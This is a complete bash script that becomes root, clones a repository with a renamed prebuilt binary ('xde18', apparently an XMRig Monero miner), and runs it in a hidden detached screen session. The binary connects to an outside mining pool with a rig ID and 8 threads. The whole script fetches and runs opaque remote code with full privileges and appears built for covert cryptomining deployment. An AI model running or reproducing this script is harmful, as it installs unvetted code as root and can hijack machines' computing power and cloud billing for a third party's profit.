#!/bin/bash
sudo -i <<EOF
apt-get update
apt-get install -y git libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/yuqingkj/xmrig_debain.git
cd xmrig_debain/
chmod 777 ./xde18
screen -dmS xmr
screen -x -S xmr -p 0 -X stuff "./xde18 -o xmr-aws.726726.xyz:3333 --rig-id az -t 8 \n"
echo ok
EOF